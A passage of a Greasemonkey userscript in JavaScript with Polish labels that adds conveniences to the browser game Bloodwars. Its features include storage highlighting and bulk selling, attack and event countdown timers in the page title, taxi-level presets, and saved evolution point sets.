            el[l].innerHTML = el[l].innerHTML.replace('Shelf 2', GM_getValue(id + 'UM_OP_polka2', 'Étagère 2'));
            el[l].innerHTML = el[l].innerHTML.replace('Shelf 1', GM_getValue(id + 'UM_OP_polka1', 'Étagère 1'));
          }
        }
        if (GM_getValue(id + 'UM_OP_fastzk', true)) {
          // mod fast zk
          unsafeWindow.clk_stock = function (event, stock) {
          }
          unsafeWindow.clk_zk = function (event, stock) {
          }
          unsafeWindow.clk_equip = function (event, stock) {
          }
          var itemS = document.getElementsByClassName('item');
          for (var i = 0; i < itemS.length; i++) {
            ta = itemS[i].getElementsByTagName('table');
            krew = false;
            if (GM_getValue(id + 'UM_OP_zkkrew', true)) if (ta[0].innerHTML.search('Tward') > 0 || ta[0].innerHTML.search('Zwierzęc') > 0 || ta[0].innerHTML.search('Gwiezdn') > 0 || ta[0].innerHTML.search('Niedźwie') > 0 || ta[0].innerHTML.search('Szamań') > 0 || ta[0].innerHTML.search('Kościan') > 0 || ta[0].innerHTML.search('Elastyczn') > 0 || ta[0].innerHTML.search('Amulet Krwi') > 0 || ta[0].innerHTML.search('Naszyjnik Krwi') > 0 || ta[0].innerHTML.search('Łańcuch Krwi') > 0 || ta[0].innerHTML.search('Apaszka Krwi') > 0 || ta[0].innerHTML.search('Pierścień Krwi') > 0 || ta[0].innerHTML.search('Sygnet Krwi') > 0 || ta[0].innerHTML.search('Bransoleta Krwi') > 0 || ta[0].innerHTML.search('Krawat Krwi') > 0) {
              ta[0].style.backgroundColor = '#aa0000';
              if (GM_getValue(id + 'UM_OP_zkkrew', true)) if (itemS[i].innerHTML.search('Posiadacz') != - 1) {
                if (ta[0].innerHTML.search('class="me"') > ta[0].innerHTML.search('Posiadacz')) {
                  document.getElementsByClassName('hr720') [0].innerHTML = '<b style=\'color: orange;font-size:1.4em;text-shadow: 1px 1px 1px black;text-shadow: -1px -1px 1px black;\'>PAMIĘTAJ O ODDANIU KRWI DO ZK ;)</b>';
                  document.getElementsByClassName('hr720') [0].style.height = '50px';
                } else {
                  document.getElementsByClassName('hr720') [0].innerHTML = '<b style=\'color: orange;font-size:1.4em;text-shadow: 1px 1px 1px black;text-shadow: -1px -1px 1px black;\'>* * * UWAGA! KREW Z ZK W UŻYCIU! * * *</b>';
                  document.getElementsByClassName('hr720') [0].style.height = '50px';
                }
              }
              if (itemS[i].innerHTML.search('Właściciel') != - 1) krew = true;
            }
            if (ta[0].innerHTML.search('class="me"') > 0) {
              ta[0].style.border = 'solid #00aa00 3px';
              if (!krew) {
                ta[0].style.backgroundColor = '#00aa00';
              }
            }
            if (krew == true) {
              ta[0].addEventListener('mousedown', function () {
                var itemS = document.getElementsByClassName('item');
                for (var i = 0; i < itemS.length; i++) {
                  var ta = itemS[i].getElementsByTagName('table');
                  if (ta[0].style.backgroundColor == 'rgb(170, 0, 0)' && ta[0].innerHTML.search('Właściciel') != - 1) {
                    ta[0].getElementsByClassName('checkbox') [0].click();
                  }
                }
              }, false);
            }
            if (!krew) ta[0].addEventListener('mousedown', function () {
              this.getElementsByClassName('checkbox') [0].click();
            }, false);
            itemS[i].getElementsByTagName('td') [1].width = '13%';
          }
          var itemS = document.getElementsByClassName('checkbox');
          for (var i = 0; i < itemS.length; i++) itemS[i].style.display = 'none';
        }        // mod clean-zk

        polka = document.getElementById('hc_c0');
        if (document.getElementById('hc_c0')) {
          input = polka.getElementsByTagName('input') [0];
          input.value = 'ODWRÓĆ';
          input.style.width = '90px';
          nowy = document.createElement('INPUT');
          nowy.type = 'button';
          nowy.value = 'CZYŚĆ';
          nowy.className = 'button';
          nowy.style.width = '90px';
          nowy.style.marginLeft = '10px';
          nowy.id = 'nowy';
          if (input.nextSibling) input.parentNode.insertBefore(nowy, input.nextSibling);
           else input.parentNode.appendChild(nowy);
          document.getElementById('nowy').addEventListener('click', function () {
            polka = document.getElementById('hc_c0');
            itemS = polka.getElementsByClassName('item');
            for (i = 0; i < itemS.length; i++) {
              itemLink = itemS[i].getElementsByTagName('TD') [2].innerHTML;
              itemLink = itemLink.replace(/&lt;/gi, '<');
              itemLink = itemLink.replace(/&gt;/gi, '>');
              itemLink = itemLink.replace('PLN', '');
              koszt = (itemLink.substring((itemLink.search('<b>') + 9), itemLink.search('</b>')).replace(/ /gi, ''));
              if (parseInt(koszt) < GM_getValue(id + 'UM_zkclean', '2000') && parseInt(koszt) > 49) {
                sellItem = itemS[i].getElementsByTagName('TD') [1].getElementsByTagName('INPUT') [0];
                sellItem.click();
              }
            }
            document.getElementsByClassName('sellButton') [1].click();
          }, false);
        }
      }
      if (a.substring(0, 9) == '?a=ambush') {
        if (document.getElementById('atkTimeLeft')) {
          czas = Math.floor(Date.now() / 1000);
          var przeliczone = 0;
          var p = document.getElementById('atkTimeLeft').innerText.split(':');
          przeliczone = parseInt(p[2]) + parseInt(p[1] * 60) + parseInt(p[0] * 60 * 60);
          czas += przeliczone;
          GM_setValue(id + 'UM_atak', czas);
          kto = document.getElementsByClassName('players') [0].innerHTML;
          GM_setValue(id + 'UM_atakkto', kto);
          var mid = '?a=msg&do=view&mid=' + document.getElementsByTagName('body') [0].innerHTML.substring(9 + document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'), document.getElementsByTagName('body') [0].innerHTML.indexOf(')', document.getElementsByTagName('body') [0].innerHTML.indexOf('addMsgId'))) + '&type=1';
          //			mid = unsafeWindow.refLinks.atkTime.substring(unsafeWindow.refLinks.atkTime.indexOf("?"),unsafeWindow.refLinks.atkTime.indexOf(">")-1);
          GM_setValue(id + 'UM_mid', mid);
        } else {
          if (document.getElementsByClassName('error')) {
          } else {
            GM_setValue(id + 'UM_atak', 0);
          }
        }
        if (GM_getValue(id + 'UM_OP_taximax', true)) {
          if (typeof unsafeWindow.taxiClickMax == 'function') {
            i = GM_getValue(id + 'UM_OP_taxilev', 5);
            for (x = 0; x < i; x++) {
              //				unsafeWindow.taxiClickMax();
              unsafeWindow.taxiAddLvl();
            }
          }
          code = 'taxiLvl=0;updateTaxi();';
          i = GM_getValue(id + 'UM_OP_taxilev', 5);
          for (x = 0; x < i; x++) {
            code += 'taxiAddLvl();';
          }
          scriptCode.push('function recalcInput(){correctFields(hisStrefa, hisSektor, hisKwadrat);\tvar pos = countPos(hisStrefa.value, hisSektor.value, myStrefa, mySektor);\tvar newTotalTime = countTotalTime(pos, taxiLvl);\tupdateForm(newTotalTime);' + code + '}');
          var script = document.createElement('script');
          script.innerHTML = scriptCode.join('\n');
          scriptCode.length = 0;
          document.getElementsByTagName('head') [0].appendChild(script);
        }
      }
      test = GM_getValue(id + 'UM_atak', 0);
      if (test > 0) {
        if (test - Math.floor(Date.now() / 1000) > 0) {
          setTimeout(function () {
            if (GM_getValue(id + 'UM_atak', 0)) {
              notification('Atak zakończony');
              GM_setValue(id + 'UM_atak', 0);
            }
          }, (test - Math.floor(Date.now() / 1000)) * 1000);
        } else {
          GM_setValue(id + 'UM_atak', 0);
        }
      }
      if (a == '?a=swr') {
        table = document.getElementsByTagName('table') [4];
        if (table.innerHTML.length < 500) table = document.getElementsByTagName('table') [5];
        if (table) {
          kw = false;
          tr = table.getElementsByTagName('tr');
          for (i = 1; i < tr.length; i++) {
            td = tr[i].getElementsByTagName('td') [0];
            sum = tr[i].getElementsByTagName('td') [3];
            if (!sum) {
              continue;
            }
            akt = parseInt(sum.getElementsByTagName('SPAN') [sum.getElementsByTagName('SPAN').length - 1].innerHTML);
            sum = sum.innerHTML.substring(sum.innerHTML.length - 20, sum.innerHTML.length).replace(/ /g, '').replace('/', '');
            if (sum - akt) {
              tr[i].getElementsByTagName('td') [3].innerHTML += ' (<span class="lnk">' + (sum - akt) + '</span>)';
              tr[i].getElementsByTagName('td') [3].style.width = '100px';
            }            //if (td.innerHTML.length<135 && td.innerHTML.length>100 || td.innerHTML.length==410 || td.innerHTML.length==250 || td.innerHTML.length==247 || td.innerHTML.length==249 || td.innerHTML.length==145) {
            //t = td.getElementsByTagName('input');

            if (td.innerHTML.length > 100) {
              kw = true;
              break;
            }            //}

          }
          if (kw) {
            czas = tr[i].getElementsByClassName('itemstacked1');
            if (czas.length) {
              czas = tr[i].getElementsByClassName('itemstacked1') [0].innerHTML;
              var rok = czas.split('-') [0].replace(/ /g, '');
              var miesiac = czas.split('-') [1];
              var dzien = czas.split('-') [2].split(' ') [0];
              var godzina = czas.split(':') [0].substring(czas.split(':') [0].length - 2, czas.split(':') [0].length);
              var minuty = czas.split(':') [1];
              var sekundy = czas.split(':') [2].substring(0, 2);
              pozniej = new Date(rok, miesiac - 1, dzien, godzina, minuty, sekundy);
            } else {
              c = tr[i].getElementsByTagName('td') [5].getElementsByTagName('div') [0].innerHTML;
              go = c.split(':') [0];
              mi = c.split(':') [1];
              se = c.split(':') [2];
              mi++;
              mi--;
              se++;
              se--;
              go++;
              go--;
              pozniej = new Date();
              pozniej.setTime(unsafeWindow.serverTime * 1000); //pozniej.getTime()+unsafeWindow.timeDiff*1000);
              if (go > 0) pozniej.setHours(pozniej.getHours() + go);
              if (mi > 0) pozniej.setMinutes(pozniej.getMinutes() + mi);
              if (se > 0) pozniej.setSeconds(pozniej.getSeconds() + se);
              rok = pozniej.getFullYear();
              miesiac = pozniej.getMonth() + 1;
              dzien = pozniej.getDate();
              godzina = pozniej.getHours();
              minuty = pozniej.getMinutes();
              sekundy = pozniej.getSeconds();
            }
            var teraz = new Date();
            teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
            GM_setValue(id + 'UM_krok', rok);
            GM_setValue(id + 'UM_kmiesiac', miesiac);
            GM_setValue(id + 'UM_kdzien', dzien);
            GM_setValue(id + 'UM_kgodzina', godzina);
            GM_setValue(id + 'UM_kminuty', minuty);
            GM_setValue(id + 'UM_ksekundy', sekundy);
            var roznica = pozniej.getTime() - teraz.getTime();
            var i = setInterval(function () {
              roznica -= 1000;
              if (roznica <= 0) {
                document.title = id.replace('r', 'R') + ' - FINISH!';
                roznica = 0;
              } else {
                time = roznica;
                var days = Math.floor(time / 86400000);
                var hours = Math.floor((time - (86400000 * days)) / 3600000);
                if (hours < 10) hours = '0' + hours;
                var minutes = Math.floor((time - (86400000 * days) - (3600000 * hours)) / 60000);
                if (minutes < 10) minutes = '0' + minutes;
                var seconds = (time - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
                seconds = Math.floor(seconds);
                if (seconds < 10) seconds = '0' + seconds;
                document.title = id.replace('r', 'R') + ' - ' + hours + ':' + minutes + ':' + seconds;
              }
            }, 1000);
          } else {
            GM_setValue(id + 'UM_krok', - 1);
            GM_setValue(id + 'UM_kmiesiac', 0);
            GM_setValue(id + 'UM_kdzien', 0);
            GM_setValue(id + 'UM_kgodzina', 0);
            GM_setValue(id + 'UM_kminuty', 0);
            GM_setValue(id + 'UM_ksekundy', 0);
          }
        }
      }
      if (a.substring(0, 11) == '?a=townshop' && GM_getValue(id + 'UM_OP_shop1', true)) {
        sklep = document.getElementsByClassName('item-link');
        for (i = sklep.length - 1; i > sklep.length - 46; i--) {
          txt = String(sklep[i].onclick);
          txt = txt.substring(txt.search('<table'), txt.search('</table') + 8);
          sklep[i].innerHTML += txt.replace(/\\/g, '').replace(/Przedmiot jednorazowego użytku/g, '').replace('<br>', '');
        }
      }
      if (a.substring(0, 11) == '?a=townshop' && GM_getValue(id + 'UM_buy_junk', false)) {
        GM_setValue(id + 'UM_buy_junk', false);
        document.getElementsByClassName('button') [0].click();
        document.getElementsByClassName('equip') [0].getElementsByClassName('enabled') [0].click();
      }
      if (a == '?a=arena') {
        table = document.getElementsByTagName('table') [4];
        tr = table.getElementsByTagName('tr');
        for (i = 1; i < tr.length; i++) {
          sum = tr[i].getElementsByTagName('td') [2];
          akt = parseInt(sum.getElementsByTagName('SPAN') [sum.getElementsByTagName('SPAN').length - 1].innerHTML);
          sum = parseInt(sum.innerHTML.substring(sum.innerHTML.length - 7, sum.innerHTML.length));
          if (sum - akt) {
            tr[i].getElementsByTagName('td') [2].innerHTML += ' (<span class="lnk">' + (sum - akt) + '</span>)';
            tr[i].getElementsByTagName('td') [2].style.width = '100px';
          }
        }
      }
      function wczytaj_ewo(set) {
        if (GM_getValue(id + 'OP_ewo_' + set, false)) {
          data = GM_getValue(id + 'OP_ewo_' + set).split('|');
          unsafeWindow.evoController.resetAllEvo();
          document.getElementById('wczytaj_ewo_1').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_2').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_3').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_4').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_5').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_6').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_7').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_8').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_9').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_10').style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set.gif)';
          document.getElementById('wczytaj_ewo_' + set).style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set_active.jpg)';
          for (x in data) {
            poz = data[x].split(':') [0];
            ewo = data[x].split(':') [1];
            if (ewo) {
              for (aa = 0; aa < ewo; aa++) {
                unsafeWindow.evoController.addEvoPt(poz);
              }
            }
          }
        }
      }
      function zapisz_ewo(set) {
        if (confirm('Czy na pewno zapisać zestaw EWO?')) {
          data = '';
          for (i = 1; i < 25; i++) {
            if (document.getElementById('dispEvo_' + i)) {
              data += i + ':' + document.getElementById('dispEvo_' + i).innerHTML + '|';
            } else {
              data += i + ':0|'
            }
          }
          data = data.substring(0, data.length - 1);
          GM_setValue(id + 'OP_ewo_' + set, data);
          document.getElementById('zapisz_ewo_' + set).style.backgroundImage = 'url(http://r12.bloodwars.interia.pl/gfx/item_set_active.jpg)';
          alert('Zapisano!');
        }
      }
      if (a == '?a=newarena&cat=2' || a == '?a=cevent&do=sacrifice' || a == '?a=ambush&opt=atk' || a == '?a=cevent' || a == '?a=swr' || a == '?a=swr&do=new' || a == '?a=swr&do=current' || a == '?a=cevent&do=new' || a == '?a=cevent&do=current' || a == '?a=newarena&cat=2&do=new' || a == '?a=newarena&cat=1' || a == '?a=newarena&cat=3' || a == '?a=cevent&do=new&chtier=2' || a == '?a=cevent&do=new&chtier=1') {
        oj = 5;
        if (a == '?a=cevent&do=current') {
          oj = 2;
        }
        if (a == '?a=cevent' || a == '?a=swr&do=new' || a == '?a=newarena&cat=2&do=new' || a == '?a=newarena&cat=1' || a == '?a=newarena&cat=3' || a == '?a=cevent&do=sacrifice' || a == '?a=newarena&cat=2') {
          oj = 1; // ? ostatni
        }
        if (a == '?a=swr&do=current' || a == '?a=ambush&opt=atk') {
          oj = 2; // ?
        }
        if (a == '?a=swr') {
          oj = 2; // ?
        }
        if (a == '?a=cevent') {
          oj = 2; // ?
        }
        dom = document.getElementsByClassName('equip') [oj];
        if (dom) {
          wczytaj = 'Wczytaj:<br/>';
          wczytaj += '<div id=\'wczytaj_ewo_1\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_1', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>1</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_2\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_2', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>2</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_3\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_3', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>3</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_4\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_4', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>4</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_5\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_5', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>5</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_6\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_6', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>6</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_7\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_7', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>7</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_8\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_8', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>8</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_9\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_9', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>9</b></div></div>';
          wczytaj += '<div id=\'wczytaj_ewo_10\' style=\'cursor: ' + (!GM_getValue(id + 'OP_ewo_10', false) ? 'normal' : 'pointer') + '; background: url(http://r12.bloodwars.interia.pl/gfx/item_set.gif) no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>10</b></div></div>';
          wczytaj += '<br style=\'clear:both;\'/><hr>';
          dom.innerHTML = wczytaj + dom.innerHTML;
          dom.innerHTML += '<hr>Zapisz:<br/>';
          dom.innerHTML += '<div id=\'zapisz_ewo_1\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_1', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>1</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_2\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_2', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>2</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_3\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_3', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>3</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_4\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_4', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>4</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_5\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_5', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>5</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_6\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_6', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>6</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_7\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_7', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>7</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_8\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_8', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>8</b></div></div>';
          5
          dom.innerHTML += '<div id=\'zapisz_ewo_9\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_9', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>9</b></div></div>';
          dom.innerHTML += '<div id=\'zapisz_ewo_10\' style=\'cursor: pointer; background: url(http://r12.bloodwars.interia.pl/gfx/item_set' + (!GM_getValue(id + 'OP_ewo_10', false) ? '.gif' : '_active.jpg') + ') no-repeat; position: relative; width: 50px; height: 30px; margin: 3px 5px; float: left;\'><div><b style=\'font-size: 20px; \'>10</b></div></div>';
          document.getElementById('zapisz_ewo_1').addEventListener('click', function () {
            zapisz_ewo(1)
          }, false);
          document.getElementById('zapisz_ewo_2').addEventListener('click', function () {
            zapisz_ewo(2)
          }, false);
          document.getElementById('zapisz_ewo_3').addEventListener('click', function () {
            zapisz_ewo(3)
          }, false);
          document.getElementById('zapisz_ewo_4').addEventListener('click', function () {
            zapisz_ewo(4)
          }, false);
          document.getElementById('zapisz_ewo_5').addEventListener('click', function () {
            zapisz_ewo(5)
          }, false);
          document.getElementById('zapisz_ewo_6').addEventListener('click', function () {
            zapisz_ewo(6)
          }, false);
          document.getElementById('zapisz_ewo_7').addEventListener('click', function () {
            zapisz_ewo(7)
          }, false);
          document.getElementById('zapisz_ewo_8').addEventListener('click', function () {
            zapisz_ewo(8)
          }, false);
          document.getElementById('zapisz_ewo_9').addEventListener('click', function () {
            zapisz_ewo(9)
          }, false);
          document.getElementById('zapisz_ewo_10').addEventListener('click', function () {
            zapisz_ewo(10)
          }, false);
          document.getElementById('wczytaj_ewo_1').addEventListener('click', function () {
            wczytaj_ewo(1)
          }, false);
          document.getElementById('wczytaj_ewo_2').addEventListener('click', function () {
            wczytaj_ewo(2)
          }, false);
          document.getElementById('wczytaj_ewo_3').addEventListener('click', function () {
            wczytaj_ewo(3)
          }, false);
          document.getElementById('wczytaj_ewo_4').addEventListener('click', function () {
            wczytaj_ewo(4)
          }, false);
          document.getElementById('wczytaj_ewo_5').addEventListener('click', function () {
            wczytaj_ewo(5)
          }, false);
          document.getElementById('wczytaj_ewo_6').addEventListener('click', function () {
            wczytaj_ewo(6)
          }, false);
          document.getElementById('wczytaj_ewo_7').addEventListener('click', function () {
            wczytaj_ewo(7)
          }, false);
          document.getElementById('wczytaj_ewo_8').addEventListener('click', function () {
            wczytaj_ewo(8)
          }, false);
          document.getElementById('wczytaj_ewo_9').addEventListener('click', function () {
            wczytaj_ewo(9)
          }, false);
          document.getElementById('wczytaj_ewo_10').addEventListener('click', function () {
            wczytaj_ewo(10)
          }, false);
          if (a != '?a=ambush&opt=atk') {
            for (i = 1; i <= 10; i++) {
              if (GM_getValue(id + 'OP_ewo_' + i, false)) {
                wczytaj_ewo(i);
                break;
              }
            }
          }
        }
      }
      if (a == '?a=cevent' || a == '?a=cevent&do=current') {
        table = document.getElementsByTagName('table') [4];
        exp = false;
        tr = table.getElementsByTagName('tr');
        for (i = 1; i < tr.length; i++) {
          td = tr[i].getElementsByTagName('td') [0];
          sum = tr[i].getElementsByTagName('td') [3];
          if (!sum) {
            continue;
          }
          akt = parseInt(sum.getElementsByTagName('SPAN') [sum.getElementsByTagName('SPAN').length - 1].innerHTML);
          sum = sum.innerHTML.substring(sum.innerHTML.length - 20, sum.innerHTML.length).replace(/ /g, '').replace('/', '');
          if (sum - akt) {
            tr[i].getElementsByTagName('td') [3].innerHTML += ' (<span class="lnk">' + (sum - akt) + '</span>)';
            tr[i].getElementsByTagName('td') [3].style.width = '100px';
          }          //			if ((td.innerHTML.length<135 && td.innerHTML.length>100) || td.innerHTML.length==250 || td.innerHTML.length==413 || td.innerHTML.length==414 || td.innerHTML.length==249 || td.innerHTML.length== 145) {

          if (td.innerHTML.length > 100) {
            //				t = td.getElementsByTagName('input');
            //				if (t.length==0) {
            exp = true;
            break;
            //				}
          }
        }
        if (exp) {
          czas = tr[i].getElementsByClassName('itemstacked1');
          if (czas.length) {
            czas = tr[i].getElementsByClassName('itemstacked1') [0].innerHTML;
            var rok = czas.split('-') [0].replace(/ /g, '');
            var miesiac = czas.split('-') [1];
            var dzien = czas.split('-') [2].split(' ') [0];
            var godzina = czas.split(':') [0].substring(czas.split(':') [0].length - 2, czas.split(':') [0].length);
            var minuty = czas.split(':') [1];
            var sekundy = czas.split(':') [2].substring(0, 2);
            pozniej = new Date(rok, miesiac - 1, dzien, godzina, minuty, sekundy);
          } else {
            c = tr[i].getElementsByTagName('td') [5].getElementsByTagName('div') [0].innerHTML;
            go = c.split(':') [0];
            mi = c.split(':') [1];
            se = c.split(':') [2];
            go++;
            go--;
            mi++;
            mi--;
            se++;
            se--;
            pozniej = new Date();
            pozniej.setTime(unsafeWindow.serverTime * 1000); //pozniej.getTime()+unsafeWindow.timeDiff*1000);
            if (go > 0) pozniej.setHours(pozniej.getHours() + go);
            if (mi > 0) pozniej.setMinutes(pozniej.getMinutes() + mi);
            if (se > 0) pozniej.setSeconds(pozniej.getSeconds() + se);
            rok = pozniej.getFullYear();
            miesiac = pozniej.getMonth() + 1;
            dzien = pozniej.getDate();
            godzina = pozniej.getHours();
            minuty = pozniej.getMinutes();
            sekundy = pozniej.getSeconds();
          }
          var teraz = new Date();
          teraz.setTime(unsafeWindow.serverTime * 1000);
          GM_setValue(id + 'UM_erok', rok);
          GM_setValue(id + 'UM_emiesiac', miesiac);
          GM_setValue(id + 'UM_edzien', dzien);
          GM_setValue(id + 'UM_egodzina', godzina);
          GM_setValue(id + 'UM_eminuty', minuty);
          GM_setValue(id + 'UM_esekundy', sekundy);
          var roznica = pozniej.getTime() - teraz.getTime();
          var i = setInterval(function () {
            roznica -= 1000;
            if (roznica <= 0) {
              document.title = id.replace('r', 'R') + ' - FINISH!';
              roznica = 0;
            } else {
              time = roznica;
              var days = Math.floor(time / 86400000);
              var hours = Math.floor((time - (86400000 * days)) / 3600000);
              if (hours < 10) hours = '0' + hours;
              var minutes = Math.floor((time - (86400000 * days) - (3600000 * hours)) / 60000);
              if (minutes < 10) minutes = '0' + minutes;
              var seconds = (time - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
              seconds = Math.floor(seconds);
              if (seconds < 10) seconds = '0' + seconds;
              document.title = id.replace('r', 'R') + ' - ' + hours + ':' + minutes + ':' + seconds;
            }
          }, 1000);
        } else {
          GM_setValue(id + 'UM_erok', - 1);
          GM_setValue(id + 'UM_emiesiac', 0);
          GM_setValue(id + 'UM_edzien', 0);
          GM_setValue(id + 'UM_egodzina', 0);
          GM_setValue(id + 'UM_eminuty', 0);
          GM_setValue(id + 'UM_esekundy', 0);
        }
      }
      if (a == '?a=aliance') {
        if (GM_getValue(id + 'UM_OP_ukryj', true)) {
          opis = document.getElementsByClassName('clan-desc');
          if (opis.length) {
            opis = opis[0];
            opis.innerHTML = '<center><a id="UM_OP_ukryj" href="javascript:">UKRYWANIE OPISU PUBLICZNEGO AKTYWNE, KLIKNIJ BY WYŁĄCZYĆ TĄ OPCJE!</a></center>';
            document.getElementById('UM_OP_ukryj').addEventListener('click', function () {
              GM_setValue(id + 'UM_OP_ukryj', false);
              location.reload();
            }, false);
          }
        } else {
          opis = document.getElementsByClassName('clan-desc');
          if (opis.length) {
            opis = opis[0];
